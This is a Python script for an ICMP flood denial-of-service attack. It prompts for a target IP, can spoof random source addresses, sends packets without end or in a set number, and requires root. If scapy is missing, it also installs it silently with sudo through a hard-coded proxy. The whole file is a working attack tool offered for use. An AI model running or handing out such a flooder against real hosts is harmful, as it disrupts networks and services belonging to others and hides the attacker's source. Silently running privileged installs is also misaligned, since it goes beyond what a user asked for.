import os
import sys
from utils.logger_util import get_logger
from utils.ifaces_util import get_ifaces

# set logger
logger = get_logger('icmp_flood_logger', './log/icmp_flood.log')

try:
    from scapy.all import *
except ImportError as e:
    try:
        os.system('sudo pip3 install scapy --proxy="http://10.50.128.110:3128"')
        logger.debug('scapy have been installed successfully! ! !')
        from scapy.all import *
    except Exception as e:
        logger.debug(f"======scapy installation failed======\n{e}\n")

from utils.thread_util_refactor import packThread

# verify that the user running the script is root
if os.getuid() != 0:
    logger.error('You need to run this program as root.')
    sys.exit(1)

# input the parameters to attack
pack_count = 0
dst_ip = input('Input IP :')
src_type = input('Choose random or local source ip, please input r or l : ')
send_pack_type = input('Send packets way : infinite loop or quantitative, please input l or q : ')
if send_pack_type == 'q' or send_pack_type == 'Q':
    pack_count = int(input('The total number of packets expected to be sent :'))

# get the default gateway and nicname
ifaces_info = get_ifaces()
iface_ip = input('Please select the interface to send packets by inputting IP address:')
iface_name = ifaces_info[iface_ip][0]

logger.debug('The dst IP is %s, the interface used to send packets is %s.' % (dst_ip, iface_name))

# select the source IP type
src_ip = ""
if src_type == 'r' or src_type == 'R':
    src_ip = RandIP()
    logger.debug('The src IP uses random mode.')
elif src_type == 'l' or src_type == 'L':
    src_ip = iface_ip
    logger.debug('The src IP uses the local host IP.')

if __name__ == "__main__":
    try:
        logger.info('Sending packets, please wait a moment! ! !')
        th = packThread(pack_count, src_ip, dst_ip, iface_name, logger, 'ICMP', send_pack_type=send_pack_type)
        th.sendPackThread()
        if send_pack_type == 'q' or send_pack_type == 'Q':
            logger.info('%s packages has been sent to %s! ! !' % (pack_count, dst_ip))
    except KeyboardInterrupt:
        print("exit")
        sys.exit(0)